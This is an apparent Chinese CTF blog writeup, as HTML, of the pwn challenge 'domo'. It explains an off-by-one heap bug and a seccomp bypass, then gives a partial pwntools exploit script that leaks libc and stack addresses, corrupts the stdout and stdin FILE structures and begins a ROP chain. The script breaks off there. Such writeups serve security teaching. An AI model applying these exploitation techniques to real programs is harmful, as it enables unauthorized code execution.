@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>GKCTF Writeup - Luexp</title><meta name="Description" content="Luexp&#39;s blog"><meta property="og:title" content="GKCTF Writeup" />
+<meta property="og:description" content="分享一个比赛的两道题目" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/gkctf-writeup/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-05-28T21:20:17+00:00" />
+<meta property="article:modified_time" content="2020-05-28T21:20:17+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="GKCTF Writeup"/>
+<meta name="twitter:description" content="分享一个比赛的两道题目"/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/gkctf-writeup/" /><link rel="prev" href="http://example.org/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" /><link rel="next" href="http://example.org/crakeme160-005-ajj-2/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "GKCTF Writeup",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/gkctf-writeup\/"
+        },"genre": "posts","keywords": "pwn, wp","wordcount":  1435 ,
+        "url": "http:\/\/example.org\/gkctf-writeup\/","datePublished": "2020-05-28T21:20:17+00:00","dateModified": "2020-05-28T21:20:17+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Luexp"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Luexp"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/logo.png"
+        data-srcset="/logo.png, /logo.png 1.5x, /logo.png 2x"
+        data-sizes="auto"
+        alt="/logo.png"
+        title="/logo.png" />Luexp&#39;s Life</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="GO!"> 文章 </a><a class="menu-item" href="/tags/" title="BIU!"> 标签 </a><a class="menu-item" href="/categories/" title="BOOM!"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Luexp"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/logo.png"
+        data-srcset="/logo.png, /logo.png 1.5x, /logo.png 2x"
+        data-sizes="auto"
+        alt="/logo.png"
+        title="/logo.png" />Luexp&#39;s Life</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="GO!">文章</a><a class="menu-item" href="/tags/" title="BIU!">标签</a><a class="menu-item" href="/categories/" title="BOOM!">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">GKCTF Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Luexp</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>ctf</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-05-28">2020-05-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1435 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 3 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#漏洞分析">漏洞分析</a></li>
+    <li><a href="#exp">EXP</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#漏洞分析-1">漏洞分析</a></li>
+    <li><a href="#exp-1">EXP</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>分享一个比赛的两道题目</p>
+<h1 id="domo">domo</h1>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>程序漏洞十分明明显，有一个off by one和任意地址写，难点在于程序使用了seccomp开启了沙箱，同时会对malloc_hook和realloc_hook检测是否写入，如果写入了，就不能再进行菜单操作，也就不能用malloc去触发onegadget。</p>
+<p>但是出题人使用seccomp不是在程序开头，而是在程序结束时，这就造成了几个非预期解。比如seccomp会调用calloc，所以可以写calloc_hook来触发onegadget或则利用scanf输入大量字节触发malloc，进而可以通过写__malloc_hook来获得shell。</p>
+<p>如果出题人是将seccomp用在开头，那么就不会有这些非预期解了，就只能用预期解来做。由于seccomp限制了execve，所以我们只能用orw来做，但是如何用程序的漏洞来达到写程序的stack，构造ROP呢？这就是这道题有意思的地方。</p>
+<p>思路是这样的：</p>
+<ul>
+<li>攻击stdout，来输出environ的内容，environ的值是一个栈的地址，这个栈地址是栈底信息的指针，调试一下可以看到，栈底保存了程序环境变量，程序名等等信息。==&gt;泄漏栈地址</li>
+<li>攻击stdin，修改其缓冲区为main函数储存返回地址的栈地址。</li>
+<li>构造ROP链，修改栈中的数据，来获得flag</li>
+</ul>
+<p>这里最有趣的一点就是攻击stdin，在之前通常都是攻击stdout来泄漏libc地址。</p>
+<p>攻击stdin的方式就是将其的IO_Buf修改为栈地址，这样输入的数据就会先存放在栈地址中，进而可以构造ROP。</p>
+<h2 id="exp">EXP</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+	<span class="n">sh</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node3.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">29731</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+	<span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./domo&#39;</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;I386&#39;</span><span class="p">]:</span>
+	<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span>
+<span class="k">else</span><span class="p">:</span>
+	<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
+
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>
+	<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">choice</span><span class="p">(</span><span class="n">elect</span><span class="p">):</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">elect</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="n">num</span><span class="p">):</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span><span class="s1">&#39;&#39;&#39;
+</span><span class="s1">b*0x7ffff77e7102
+</span><span class="s1">c	
+</span><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1">#0</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1">#1</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1">#2</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>     <span class="c1">#-0</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>     <span class="c1">#-1</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>     <span class="c1">#-2</span>
+<span class="c1">#leak libc</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="c1">#0</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>		 
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">libc_base</span><span class="o">=</span><span class="n">u64</span><span class="p">((</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">+</span><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span><span class="o">-</span><span class="mh">0x3c4b0a</span>
+<span class="n">environ_addr</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;environ&#39;</span><span class="p">]</span>
+<span class="n">stdout_hook</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">]</span>
+<span class="n">stdin_hook</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdin_&#39;</span><span class="p">]</span>
+<span class="n">_IO_file_jumps</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;_IO_file_jumps&#39;</span><span class="p">]</span>
+<span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stdin_hook</span><span class="p">)</span>
+<span class="c1">#leak heap</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="c1">#1</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">heap</span><span class="o">=</span><span class="n">u64</span><span class="p">((</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">+</span><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span><span class="o">-</span><span class="mh">0x0a</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="c1">#2</span>
+<span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span>
+<span class="c1">#leak stack</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="c1">#3</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1">#4</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1">#5</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>     <span class="c1">#-3</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xd0</span><span class="p">))</span> <span class="c1">#3</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>    <span class="c1">#-1</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xd1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x140</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x120</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span> <span class="c1">#1</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>    <span class="c1">#-4</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>    <span class="c1">#-3</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x110</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">11</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">stdout_hook</span><span class="o">-</span><span class="mh">0x43</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">=</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">5</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">_IO_file_jumps</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1811</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">environ_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">environ_addr</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span>
+<span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">stack</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span><span class="o">-</span><span class="mh">0xf2</span>
+<span class="c1">#modify stdin</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="n">stdin_hook</span><span class="o">-</span><span class="mh">0x20</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x71</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x110</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">11</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">stdin_hook</span><span class="o">-</span><span class="mh">0x28</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">_IO_file_jumps</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="o">+</span><span class="mh">0x100</span><span class="p">)</span>
+<span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">,</span><span class="s1">&#39;./flag</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<span class="c1">#rop</span>
+<span class="n">pop_rdi_ret</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;pop rdi</span><span class="se">\n</span><span class="s2">ret&#34;</span><span class="p">))</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
+<span class="n">pop_rsi_ret</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;pop rsi</span><span class="se">\n</span><span class="s1">ret&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
